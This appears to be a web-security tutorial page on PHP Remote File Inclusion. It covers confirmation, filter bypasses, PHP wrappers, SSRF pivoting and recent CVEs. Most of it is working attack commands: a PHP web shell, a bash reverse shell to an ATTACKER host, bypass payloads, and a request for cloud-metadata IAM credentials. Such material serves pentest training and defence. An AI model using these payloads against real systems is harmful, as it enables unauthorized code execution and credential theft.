+++
title = 'Remote File Inclusion (RFI)'
date = 2026-10-30
type = 'notes'
weight = 140
toc = true
tags = ['web', 'web-attacks', 'rfi', 'file-inclusion']
+++

Remote File Inclusion (RFI) occurs when an application loads a file from a **remote URL** supplied by the attacker — typically through a PHP `include()` or `require()` statement that uses user-controlled input. Unlike LFI, which reads files already on the server, RFI **fetches the file from the attacker's server and executes it**, which makes it a **direct path to remote code execution** without writing anything to disk.

> **The catch:** RFI requires `allow_url_include = On` in `php.ini`. This is **disabled by default** since PHP 5.2 and remains off on virtually every modern installation. The vulnerability is therefore **less common than LFI**, but when it exists, it is the fastest route to RCE — no log poisoning, no file upload, no race condition.

Almost any RFI vulnerability is also an LFI vulnerability: the same parameter that accepts a remote URL will accept a local path. Test both directions.

---

## 1. Prerequisites — `allow_url_include`

Before investing time in an RFI payload, confirm the setting is actually enabled. A `403` or a blank response is ambiguous — it may mean the inclusion failed, or it may mean the file was fetched but not displayed.

### 1.1 Read the PHP configuration

```bash
# Apache — adjust the PHP version
curl "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Nginx / FPM
curl "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/fpm/php.ini"

# Decode and check
echo 'BASE64VALUE' | base64 -d | grep allow_url_include
```

If `allow_url_include = Off`, RFI through `http://` will not work. Move to the wrapper-based techniques in §5 — `data://`, `php://input`, and `phar://` may still be available, and log poisoning (LFI-to-RCE) is the fallback.

> **Note:** `allow_url_include` can only be set in `php.ini` (or `httpd.conf`) — it **cannot** be changed at runtime with `ini_set()`. This is a hard PHP restriction, which is why the setting is so reliable as a gate.

---

## 2. Confirming RFI Is Active

A false positive wastes time and generates noise. Confirm the server actually fetches remote URLs **before** deploying a shell.

### 2.1 Visible confirmation

```bash
# Host a harmless test file
echo 'RFICONFIRM' > /tmp/rfi_test.txt
python3 -m http.server 8000 -d /tmp &

# Point the vulnerable parameter at it
curl "http://TARGET/index.php?page=http://ATTACKER:8000/rfi_test.txt"
```

If `RFICONFIRM` appears in the response, the server fetched the file and included its content. This is a **confirmed, visible RFI**.

### 2.2 Blind confirmation

If the response does not contain the marker **but your HTTP server received a request**, the file was fetched and included — the output is simply not displayed. This is **blind RFI**, and it is still exploitable for code execution: the included PHP runs even when its output goes nowhere.

```bash
# Your HTTP server log shows:
# 10.10.14.5 - - [..] "GET /rfi_test.txt HTTP/1.0" 200 -
```

> **Blind RFI is the more common case in 2026.** Modern applications buffer output, disable `display_errors`, or include files in a context where the result is discarded. The confirmation signal is the **inbound request**, not the reflected marker.

### 2.3 If the server refuses remote URLs

A filter may block `http://` but accept other schemes. Test the full set in §5 before concluding RFI is closed.

---

## 3. Remote Code Execution via RFI

Once RFI is confirmed, the path to RCE is direct: host a PHP web shell and include it.

### 3.1 Web shell

```bash
# Host the shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
python3 -m http.server 8000 -d /tmp &

# Include it and pass a command
curl "http://TARGET/index.php?page=http://ATTACKER:8000/shell.php&cmd=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 3.2 Reverse shell

```bash
# Listener
nc -lvnp 4444

# Host a shell that initiates the connection
cat > /tmp/rev.php <<'EOF'
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"); ?>
EOF
python3 -m http.server 8000 -d /tmp &

# Trigger
curl "http://TARGET/index.php?page=http://ATTACKER:8000/rev.php"
```

If `bash` is unavailable, use the `mkfifo` method or a Python reverse shell in the `cmd` parameter of the web shell.

> **Run the HTTP server on a different port from the listener.** If both use `8000`, the reverse shell's outbound connection collides with the inclusion request.

---

## 4. Filter Bypasses

Applications that block `http://` often miss other protocols or encoding variants. Test these in order.

### 4.1 Null byte (PHP < 5.3.4)

The classic bypass: append `%00` to truncate a suffix the application adds to the filename.

```bash
http://TARGET/index.php?page=http://ATTACKER:8000/shell.php%00
http://TARGET/index.php?page=http://ATTACKER:8000/shell.php%00.jpg
```

This works only on **legacy PHP** (< 5.3.4). Modern PHP is not affected — do not rely on it on a current target.

### 4.2 Encoding variants

```bash
# URL-encoded
http://TARGET/index.php?page=http%3A%2F%2FATTACKER%3A8000%2Fshell.php

# Double-encoded
http://TARGET/index.php?page=http%253A%252F%252FATTACKER%253A8000%252Fshell.php

# Mixed
http://TARGET/index.php?page=hTtP://ATTACKER:8000/shell.php
```

### 4.3 Protocol variations

Filters that block `http://` and `https://` frequently allow **`ftp://`** or a **UNC path**:

```bash
# FTP
http://TARGET/index.php?page=ftp://ATTACKER/shell.php&cmd=id

# SMB / UNC (Windows targets, or PHP on Windows)
http://TARGET/index.php?page=\\ATTACKER\share\shell.php&cmd=id
```

This is the same protocol-diversity principle as SSRF: the filter matches a string, and the runtime accepts several schemes that string does not cover.

### 4.4 Path and parameter tricks

```bash
# Append a query string — some filters check the URL end
http://TARGET/index.php?page=http://ATTACKER:8000/shell.php?x=1

# Case variation
http://TARGET/index.php?page=HTTP://ATTACKER:8000/shell.php

# Wrapper-prefixed
http://TARGET/index.php?page=php://filter/resource=http://ATTACKER:8000/shell.php
```

---

## 5. Alternative Protocols and PHP Wrappers

When `allow_url_include` is off but the application still has an inclusion primitive, **local wrappers** often provide code execution without a remote fetch.

| Wrapper | Requirement | Primitive |
|---|---|---|
| **`data://`** | `allow_url_include=On` | Inline PHP code — no remote server needed |
| **`php://input`** | `allow_url_include=On` | POST body is treated as the included file |
| **`expect://`** | `expect` extension loaded | **Direct command execution** |
| **`phar://`** | Upload of a crafted PHAR archive | RCE from an uploaded file |
| **`zip://`** / **`rar://`** | Upload of a ZIP/RAR containing PHP | RCE from an uploaded archive |

### 5.1 `data://`

```bash
http://TARGET/index.php?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
http://TARGET/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

`data://` is restricted by `allow_url_include` in the same way as `http://` — it is an "URL" wrapper. If `allow_url_include` is off, it fails.

### 5.2 `php://input`

```bash
curl -X POST "http://TARGET/index.php?page=php://input" \
  --data "<?php system('id'); ?>"
```

Also requires `allow_url_include=On`. It is useful when the vulnerable parameter is on a `POST` endpoint and the filter checks the parameter value but not the body.

### 5.3 `expect://` — direct command execution

```bash
http://TARGET/index.php?page=expect://id
http://TARGET/index.php?page=expect://ls
```

This is the **fastest path to RCE** when the `expect` extension is loaded — no remote server, no shell upload. Check with `php -m | grep expect`; it is rare but present on some default builds.

### 5.4 `phar://`, `zip://`, `rar://` — RCE from an upload

If the application has **both** an upload feature and an inclusion primitive, upload a PHP file inside a PHAR/ZIP and include it through the wrapper.

```bash
# Create a ZIP containing a PHP shell
echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg        # rename to bypass upload filters

# Include through zip:// (the # separates the archive from the inner path)
http://TARGET/index.php?page=zip://uploads/shell.jpg%23payload.php&cmd=id
```

The same pattern works with `phar://` and `rar://`. This is an **LFI-to-RCE chain**, not a remote inclusion — but it belongs in the RFI discussion because it is the practical fallback when `allow_url_include` is off.

---

## 6. RFI to SSRF — Internal Port Scanning and Enumeration

An RFI that can reach `http://` is **also an SSRF primitive**: the server makes the request, and the response (or the error) tells you whether the internal host is reachable. This is the same class as a standalone SSRF, but the injection point is the inclusion parameter.

### 6.1 Port scanning via response differential

```bash
# Internal port that is open — include may succeed or return a parse error
http://TARGET/index.php?page=http://127.0.0.1:80/

# Internal port that is closed — connection refused, different error
http://TARGET/index.php?page=http://127.0.0.1:9999/
```

The **error message difference** between a closed port (`Connection refused`) and an open port (`failed to open stream: HTTP request failed`) confirms the port state. This is a blind SSRF primitive driven by the inclusion parameter.

### 6.2 Enumerating internal web applications

```bash
# If 127.0.0.1:8080 hosts an admin panel, include its index
http://TARGET/index.php?page=http://127.0.0.1:8080/index.php
```

If the application reflects the included content, you read the internal page. If it does not, the response timing and error still reveal existence.

### 6.3 Cloud metadata

```bash
http://TARGET/index.php?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

If the RFI can reach the metadata endpoint, it returns the instance role's credentials — the same payoff as a cloud SSRF. Note that `allow_url_include` must be on for this to work; if only `allow_url_fopen` is on, `file_get_contents()`-based inclusion may still fetch it.

---

## 7. RFI vs LFI — What Actually Changed in 2026

| | **LFI** | **RFI** |
|---|---|---|
| **Source** | File already on the server | File on an attacker-controlled server |
| **`allow_url_include`** | Not required | **Required** |
| **Prevalence** | Common | Rare (disabled by default since PHP 5.2) |
| **Direct RCE** | No — needs log poisoning, wrappers, or an upload | **Yes** — include a PHP shell |
| **2026 status** | Still the primary file-inclusion bug | Mostly replaced by **LFI-to-RCE chains** (log poisoning, `php://filter` chains, `phar://`) |

The 2025–2026 CVE feed reflects this: most entries labelled "PHP Remote File Inclusion" are actually **LFI** in WordPress themes and plugins — the CWE-98 label is applied because the include statement *could* accept a remote URL, but the practical exploitation is local file read.

> **Practical takeaway:** do not dismiss a parameter because `allow_url_include` is off. The same parameter is an **LFI**, and LFI-to-RCE via log poisoning or `php://filter` chains is the 2026 default.

---

## 8. Real-World RFI / File Inclusion CVEs (2025–2026)

| CVE / Advisory | Product | Notes |
|---|---|---|
| **CVE-2026-57789** | Aqua Plugin | Include/require statements manipulated to load remote or local PHP code |
| **CVE-2026-112832** | Rootblox (CozyThemes) | CWE-98 — include/require filename control |
| **CVE-2026-54814** | Motors (StylemixThemes) | CWE-98 — RFI/LFI in a WordPress plugin |
| **CVE-2025-69065** | Snow Mountain (AncoraThemes) | CWE-98 labelled RFI, exploited as LFI ≤ 1.4.3 |
| **CVE-2025-58897** | Fermentio (Axiomthemes) | CWE-98 — include/require filename control |
| **CVE-2026-28049** | Police Department (ThemeREX) | CWE-98 — include/require filename control |
| **CVE-2025-68065** | Hub Core (LiquidThemes) | CWE-98 — include/require filename control ≤ 5.0.8 |

> **The pattern:** almost every "RFI" CVE in 2025–2026 is a WordPress theme or plugin with a user-controlled `include()`. The label says remote; the exploitation is local — because `allow_url_include` is off on the target.

---

## 9. Testing Methodology

```bash
# 1. Identify inclusion points
#    ?page=  ?file=  ?template=  ?path=  ?include=  ?view=  ?module=

# 2. Confirm LFI first
curl "http://TARGET/index.php?page=../../../../etc/passwd"

# 3. Check allow_url_include
curl "http://TARGET/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
# decode and grep allow_url_include

# 4. If On, confirm RFI with a test file
echo 'RFICONFIRM' > /tmp/rfi.txt
python3 -m http.server 8000 -d /tmp &
curl "http://TARGET/index.php?page=http://ATTACKER:8000/rfi.txt"

# 5. If confirmed, deploy a web shell
curl "http://TARGET/index.php?page=http://ATTACKER:8000/shell.php&cmd=id"

# 6. If http:// is filtered, try ftp://, UNC, encoding, null byte

# 7. If allow_url_include is Off, pivot to:
#    - data:// / php://input (if allow_url_include is On but http is filtered)
#    - expect:// (if the extension is loaded)
#    - zip:// / phar:// (if an upload feature exists)
#    - log poisoning (LFI-to-RCE)
```

---

## 10. Field Notes

- **`allow_url_include` is the gate, and it is off by default.** Confirm it before spending time on an `http://` payload — a blank response is not a finding.
- **Blind RFI is confirmed by the inbound request, not the reflected output.** If your HTTP server logs a hit, the file was fetched and included — the shell will execute even if its output is not shown.
- **`expect://` is the shortest RCE path** when the extension is loaded — no remote server, no shell upload.
- **`zip://` and `phar://` turn an LFI into RCE** when an upload feature exists. This is the practical replacement for RFI in 2026.
- **RFI is also SSRF.** The inclusion parameter can reach internal ports and cloud metadata; the response differential confirms port state.
- **Most 2025–2026 "RFI" CVEs are actually LFI.** The CWE-98 label reflects the *potential* for remote inclusion, not the exploitability on a default PHP build.
- **Do not rely on the null-byte bypass.** It only works on PHP < 5.3.4; modern targets are unaffected.
- **Protocol diversity beats string filters.** `ftp://` and UNC paths frequently survive a filter that blocks `http://`.
